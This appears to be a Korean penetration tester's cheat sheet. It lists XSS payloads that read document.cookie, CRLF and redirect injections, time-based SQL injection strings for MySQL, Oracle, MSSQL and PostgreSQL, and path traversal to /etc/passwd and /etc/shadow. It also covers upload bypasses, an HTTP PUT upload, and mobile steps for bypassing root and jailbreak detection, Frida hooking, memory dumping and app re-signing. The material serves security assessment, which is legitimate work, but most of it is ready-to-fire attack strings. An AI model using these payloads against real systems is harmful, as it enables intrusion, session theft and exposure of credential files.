
# XSS

```
&quot; &#34;&#22;%22
&lt; &#60; %3C
&gt; &#62; %3E

<script>alert(document.cookie)</script>
<img src='x' onerror='alert(document.cookie)'>
<img src=a onerror=confirm(document['cookie'])>
<img src=x onerror=confirm(1)"<!-- >
<MARQUEE><img src=a onerror=confirm(document['cookie'])></MARQUEE>
<img src=x on<!--->error=&#97;lert&#40;&#100;ocument.cookie&#41;>
<embed src=//14.rs>
<style onload="<!--  >
alert
(document.location)"></style>

<iframe><textarea></iframe><img src="" onerror="alert(document.domain)">
<svg/onload=prompt(/NIRS_XSSPOSED/)>
<svg id=x onfocus=alert(1)>
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:ale<!-- -->rt('XSS')"></B></I></XML>

<ScscriptRipt>var e=eval;var a='alert(documen'; var b='t.cook'; var c='ie)';e(a+b+c);</ScscriptRipt>

location.href='https://search.naver.com/search.naver?query=aa'&&'https://daum.net'

%0d%0aLocation:%20%3cimg%20src=x%20onerror=alert(1)%3ehttp://test.com

javascript://%0aalert()
javascript://%0dalert()
javascript:/**/%0aalert()

hacktivity
- response cookie 값에 xss 삽입 
https://www.yelp.com/?canary=asdf guvo=</script><script>alert(1)</script>

"><script>window.location.replace(‘https://www.tryhacme.com’)</script>
<img src=x onerror=window.location.replace('https://www.naver.com')>

<img src=x onerror=location.replace('https://www.naver.com')>


(SELECT * FROM (SELECT(SLEEP(5)))a)#
1000;%20select%20sleep%20(5);#
```

## Reflected XSS
- CRLF 
- 동작 조건 :  /10 등 url 경로로 페이지 이동 사이트 
```
%0d%0aLocation:%20%3cimg%20src=x%20onerror=alert(1)%3ehttp://test.com

ex)
www.myweb.com/data/%0d%0aLocation:%20%3cimg%20src=x%20onerror=alert(1)%3ehttp://test.com
```

# SQL 

```
OR+'1'='1'
' AND (SELECT CASE WHEN 1=1 THEN DBMS_PIPE.RECEIVE_MESSAGE(('A'),3) ELSE 2 END FROM DUAL) = 1 --

123’or’1%’=’1


MYSQL
database() 데이터베이스 이름 
LENGTH(DATABASE())
ASCII(SUBSTRING(DATABASE(),1,1))
테이블 목록
SELECT *  FROM information_schema.tables where table_schema=database() ;
첫번째 테이블 첫번째 이름 자릿수 
(SELECT LENGTH(TABLE_NAME) FROM information_schema.tables where table_schema=database() LIMIT 0,1)
첫번째 테이블 첫번째 이름 ascii
(SELECT ASCII(SUBSTRING(TABLE_NAME,1,1)) FROM information_schema.tables where table_schema=database() LIMIT 0,1)

oracel
DBMS_PIPE.RECEIVE_MESSAGE(('A'),3) 

mssql 
' waitfor delay 0:0:5


PortgreSQL 
# usage examples: 
/?whatever=1;(select 1 from pg_sleep(5))
/?whatever=1||(select 1 from pg_sleep(5))


```


# File Download

```
* 중간에 파일명 있으면 안됨, 실제 없는 폴더명도 안됨, 
../../../../../../../../../../../../
../etc/passwd 
../etc/shadow
../계정명/.bash_history 
 ../boot.ini
../winnt/win.ini
```

# File Upload

```
text/plain

test.exe%00.jpg

//content-type 
application/octetstream
```

## PUT 
```
PUT /finss_boantest2.html HTTP/1.1
Host: www.site.co.kr:8081<http://www.site.co.kr:8081/>
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Length: 143

<!doctype html>
<html lang="ko">
 <head>
  <meta charset = utf-8">
  <title>
finss test </title>
 </head>
 <body>
	
 </body>
</html>
```


# FormatString

```
%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s!
```


# IOS

```
ipa  압축 풀고 -> ida로

00. 탈옥 우회 
tool - flyjb x, 설정(a-bypass), shadow
jail
cydia 
private

1. 사용법 
spacebar : 그래프모드, 일반모드 전환
alt + t  검색 
findall
shift + f12 String 검색 ! 
ctrl+1 에서 hex dump 선택 시 hex view 창 
IDA View 에서 우클릭 후 synchronize with 후 HEX view 선택시 
IDA View에서 드래그 하면 Hex에서 바로 확인 가능


18. 단말기내 중요정보 노출
/private/var/mobile/Containers/Data/Application
grep -rinoE 'finss12!@' *
- uuid 확인 방법 3utools에서
/private/var/mobile/Containers/Data/Application/
: 수정된 날짜 가장 최신순으로 정렬

- 이 폴더가 맞는지는 library/preferences/ 까지가면 나옴

in mac 
- Cyberduck 사용해서 아이폰 접근 
- finder의 이동 -> sftp://아이폰아이피 

20. 디버깅 탐지기능 적용
putty root/alpine

ps -ef | grep 'sensmail'
lldb -p 23477

lldb-10
process attach -n CNR

(lldb) br s -a [서브주소]+[앱베이스주소]

23. 메모리내 중요정보 노출
python fridump3.py -u -r [pid] -s 
- 오류 날 경우 다른 iphone 으로 진단 
- 오류 날 경우 백신 실시간 탐지 끄기

26. 프로그램 무결성 검증
ipa dump 시 dump.py ip 설정 확인 
python dump.py [앱이름] -> 공백 있을경우 ""로 묶어준다.

- 시작 클래스 찾기 didFinishLaunchingWithOptions

- hex코드 맨밑에00 -> 11로 변경 ! 

서명 
ldid -e sensmail2 > sens_sign.xml
 chmod +x sensmail
ldid -Ssens_sign.xml sensmail

27. 디버그로그내 중요정보
3utools toolbox realtime log

in mac 
- console.app , 콘솔 검색 
- 연결된 기기 iPhone 선택 후 앱 실행 
- 시작 버튼 클릭 , 작업 후 일시정지 
- 우측 상단 검색에 app명(IPA) 검색 
- 로그내용 com + a 로 전체 복사 후 vsstudio에 붙여넣기 

99. 우회 

//실행하면서 js 후킹
frida -U -f 패키지명 -l 스크립트파일명

//실행중인 앱
frida -U -l 스크립트파일명 앱이름

99. ios 다운로드 폴더 접근 경로
cd /private/var/mobile/Containers/Shared/AppGroup/43C21AE1-BE6E-40C5-8B22-BA86665EEC4D/File Provider Storage/finss


```


# Android

```
탐지우회
bypass_root.js

- 프리다 서버 
ps -ef | grep 'fri'
# netstat -antp | grep fri	
kill -9 pid

- 프리다 usb 말고 원격접속방법 
./frida-server-16.1.3-android-arm64 -l 0.0.0.0:27000 &
 frida-ps -ai -H 192.168.1.120:27000 

frida -H 192.168.1.120:27000 -f com.app.damnvulnerablebank -l bypass_root_ohbank.js

- apk 파일 추출
APK Extractor 어플(파란색) -> 스플릿파일 추출이 잘안됨 
Apktool M 

18. 단말기내 중요정보 저장
adb shell 
cd /data/data/[패키지명] 
 grep -rinoE 'finss12!@' *

20. 디버깅 탐지기능 적용
ida 설치 경로에 가서 dbgsrv 디렉터리를 보면 여러 서버 파일들이 있다.마찬가지로 아키텍처에 맞는 것을 단말기에 넣어준다
adb push android_x86_server /data/local/tmp

여기서부터 진행하면 됨.
adb shell 
/data/local/tmp 
권한부여 
chmod 777 android_server64
실행
./android_server64

이후
ida - debugger - armlinux/android debugger
host 입력

> 해당 패키지 선택 

23. 메모리 내 중요정보 노출
python fridump3.py -u -r [pid] -s 

26.무결성검증 테스트
기존 locals + 4  -> 안해도 되는듯?
const-string v0, "무결성 검증 테스트"
	const/4 v1, 0x0
	invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
	move-result-object v0
	invoke-virtual {v0},Landroid/widget/Toast;->show()V

27. 디버그 로그내 중요정보 노출 취약
앱실행시? 
adb logcat --pid=앱pid -d -f /sdcard/log.txt
adb logcat --pid=19099 -d >log.txt

*******************
nox
*******************
C:\Users\finss\Nox_share

adb connect 127.0.0.1:62001
adb shell

*******************
android 화면 연결 scrcpy 
*******************
usb 신뢰할수없는 
scrp로 연결하기 

```




(text|application|json|html|xml|x-javascript)

2024년_한국환경연구원_웹_취약점_점검_결과보고서_v1.0(기후환경변화리스크평가)